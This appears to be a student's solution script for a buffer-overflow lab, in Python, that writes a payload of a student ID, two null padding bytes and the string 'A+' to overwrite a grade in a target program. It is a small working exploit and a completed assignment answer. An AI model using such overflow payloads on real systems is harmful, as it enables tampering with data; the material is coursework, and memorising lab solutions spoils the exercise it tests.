import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
UNID = "u1107676"
# found the amount of padding needed by writing "A1A2A3..."
# and checking where it was cut off
FILL_BYTES = "\00\00"
GRADE = "A+"

string_payload = UNID + FILL_BYTES + GRADE

payload = bytes(string_payload, 'utf-8')

# Launch the attack!
sys.stdout.buffer.write(payload)
